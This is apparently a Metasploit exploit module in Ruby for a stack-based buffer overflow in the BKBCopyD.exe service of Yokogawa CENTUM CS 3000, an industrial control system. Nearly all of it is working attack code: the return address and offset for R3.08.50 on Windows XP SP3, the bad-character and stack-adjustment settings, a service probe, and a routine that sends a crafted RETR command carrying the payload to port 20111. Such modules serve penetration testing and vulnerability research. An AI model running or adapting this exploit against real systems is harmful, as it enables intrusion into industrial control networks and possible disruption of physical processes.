# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Yokogawa CENTUM CS 3000 BKBCopyD.exe Buffer Overflow&#039;,
      &#039;Description&#039;    => %q{
        This module exploits a stack based buffer overflow in Yokogawa CENTUM CS 3000. The vulnerability
        exists in the service BKBCopyD.exe when handling specially crafted packets. This module has
        been tested successfully on Yokogawa CENTUM CS 3000 R3.08.50 over Windows XP SP3.
      },
      &#039;Author&#039;         =>
        [
          &#039;juan vazquez&#039;,
          &#039;Redsadic <julian.vilas[at]gmail.com>&#039;
        ],
      &#039;References&#039;     =>
        [
          [ &#039;URL&#039;, &#039;http://www.yokogawa.com/dcs/security/ysar/YSAR-14-0001E.pdf&#039; ],
          [ &#039;URL&#039;, &#039;https://community.rapid7.com/community/metasploit/blog/2014/03/10/yokogawa-centum-cs3000-vulnerabilities&#039; ]
        ],
      &#039;Payload&#039;        =>
        {
          &#039;Space&#039;          => 373, # 500 for the full RETR argument
          &#039;DisableNops&#039;    => true,
          &#039;BadChars&#039;       => "\x00\x0d\x0a\xff",
          &#039;PrependEncoder&#039; => "\x81\xc4\x54\xf2\xff\xff\xff\xff" # Stack adjustment # add esp, -3500 # double \xff char to put it on memory
        },
      &#039;DefaultOptions&#039; =>
        {
          &#039;EXITFUNC&#039; => &#039;thread&#039;,
        },
      &#039;Platform&#039;       => &#039;win&#039;,
      &#039;Targets&#039;        =>
        [
          [ &#039;Yokogawa CENTUM CS 3000 R3.08.50 / Windows XP SP3&#039;,
            {
              &#039;Ret&#039;    => 0x6404625d, # push esp # ret # libBKBUtil.dll]
              &#039;Offset&#039; => 123
            }
          ],
        ],
      &#039;DisclosureDate&#039; => &#039;Mar 10 2014&#039;,
      &#039;DefaultTarget&#039;  => 0))

    register_options(
      [
        Opt::RPORT(20111)
      ], self.class)
  end

  def check
    pkt = build_probe
    res = send_pkt(pkt)
    if valid_response?(res)
      return Exploit::CheckCode::Detected
    end

    Exploit::CheckCode::Safe
  end


  def exploit
    data = "RETR "
    data << rand_text(target[&#039;Offset&#039;])
    data << [target.ret].pack("V")
    data << payload.encoded
    data << "\n"

    print_status("Trying target #{target.name}, sending #{data.length} bytes...")
    connect
    sock.put(data)
    disconnect
  end

  def build_probe
    "#{rand_text_alpha(10)}\n"
  end

  def send_pkt(data)
    connect
    sock.put(data)
    data = sock.get_once
    disconnect

    return data
  end

  def valid_response?(data)
    return false unless !!data
    return false unless data =~ /500  &#039;yyparse error&#039;: command not understood/
    return true
  end

end

